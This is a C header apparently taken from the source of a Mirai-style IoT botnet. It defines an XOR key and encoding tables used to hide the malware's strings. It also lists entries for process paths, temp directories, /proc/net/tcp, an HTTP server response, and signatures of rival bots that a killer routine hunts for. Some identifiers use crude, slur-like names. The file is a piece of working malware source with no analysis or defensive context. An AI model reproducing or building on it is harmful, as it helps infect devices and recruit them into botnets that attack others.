#pragma once

#include <stdint.h>

#include "main.h"

static uint32_t key = 0xE0A4CBD6;

static uint8_t dec_table[66] =
{
    0x18, 0x1b, 0x1a, 0x1d, 0x1c, 0x1f, 0x1e, 0x11, 0x10, 0x13,
    0x12, 0x15, 0x14, 0x17, 0x16, 0x09, 0x08, 0x0b, 0x0a, 0x0d,
    0x0c, 0x0f, 0x0e, 0x01, 0x00, 0x03, 0x38, 0x3b, 0x3a, 0x3d,
    0x3c, 0x3f, 0x3e, 0x31, 0x30, 0x33, 0x32, 0x35, 0x34, 0x37,
    0x36, 0x29, 0x28, 0x2b, 0x2a, 0x2d, 0x2c, 0x2f, 0x2e, 0x21,
    0x20, 0x23, 0x69, 0x68, 0x6b, 0x6a, 0x6d, 0x6c, 0x6f, 0x6e,
    0x61, 0x60, 0x77, 0x76, 0x79, 0x74
};

static uint8_t enc_table[66] =
{
    0x14, 0x15, 0x0a, 0x1d, 0x1f, 0x08, 0x0e, 0x00, 0x01, 0x17,
    0x1a, 0x03, 0x0b, 0x09, 0x16, 0x12, 0x1e, 0x10, 0x0c, 0x0d,
    0x18, 0x1b, 0x0f, 0x11, 0x1c, 0x13, 0x2d, 0x3f, 0x28, 0x36,
    0x34, 0x38, 0x3c, 0x3a, 0x31, 0x35, 0x20, 0x37, 0x2c, 0x3d,
    0x2e, 0x2f, 0x33, 0x2b, 0x21, 0x30, 0x3e, 0x32, 0x23, 0x2a,
    0x3b, 0x29, 0x6e, 0x61, 0x60, 0x69, 0x6b, 0x6c, 0x6d, 0x68,
    0x6f, 0x6a, 0x64, 0x19, 0x07, 0x7d
};

enum
{
	//DOMAIN = 0,
    PROC_SELF_EXE = 1,
    PROC = 2,
    MAPS = 3,
    EXE = 4,
    COMM = 5,
    CWD = 6,
    VAR_TMP = 7,
    VAR = 8,
    PIZZA_SIG = 9,
    DONGS_SIG = 10,
    HELPER_SIG = 11,
    SLAVE_SIG = 12,
    FARTED_SIG = 13,
    LOLFGT_SIG = 14,
    WOLF_SIG = 15,
    TELNETON_SIG = 16,
    PLSDIE_SIG = 17,
    POST_MIRAI_SIG = 18,
    PROC_NET_TCP = 19,
    GET_HTTP_REQUEST = 20,
    UC_HTTPD_RESPONSE = 21,
    RUNTIME_MSG = 22,
    FD = 23,
    ENTRY_COUNT = 24
};

struct entry
{
	uint8_t id;
	char *val;
    uint16_t val_len;
};

struct entry entry_list[ENTRY_COUNT];

char *retrieve_entry_val(uint8_t);
void init_entry(void);
void load_entry(char *, uint16_t, uint8_t);
uint16_t retrieve_entry_val_len(uint8_t);
void xor(uint8_t *, int);
